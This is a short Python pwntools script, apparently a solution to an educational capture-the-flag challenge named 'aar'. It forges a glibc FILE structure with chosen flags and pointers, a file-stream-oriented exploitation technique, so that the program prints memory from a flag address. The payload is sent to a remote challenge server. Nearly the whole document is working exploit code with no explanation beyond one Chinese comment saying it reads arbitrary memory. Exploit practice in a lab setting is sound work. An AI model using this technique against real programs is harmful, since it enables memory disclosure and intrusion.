#!/usr/bin/python3

from pwn import *
from sys import argv

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

aar_flag_addr = 0x404050
lock_addr = 0x4040a0

padding = p64(0) * 3 + p64(0x1e1)

# 從任意記憶體讀資料，印到 stdout
def aar():
    f = FileStructure(0)
    f.flags = 0xfbad0800

    f._IO_read_end = aar_flag_addr

    f._IO_write_base = aar_flag_addr
    f._IO_write_ptr = aar_flag_addr + 0x10
    f._IO_write_end = 0
    f._lock = lock_addr
    f.fileno = 1
    return padding + bytes(f)[:-8]

#r = process('./aar', env={"LD_PRELOAD": "/usr/src/glibc/glibc_dbg/libc.so"}, aslr=False)
r = remote('edu-ctf.zoolab.org', 10010)
payload = aar()

# gdb.attach(r)
r.send(payload)
r.interactive()
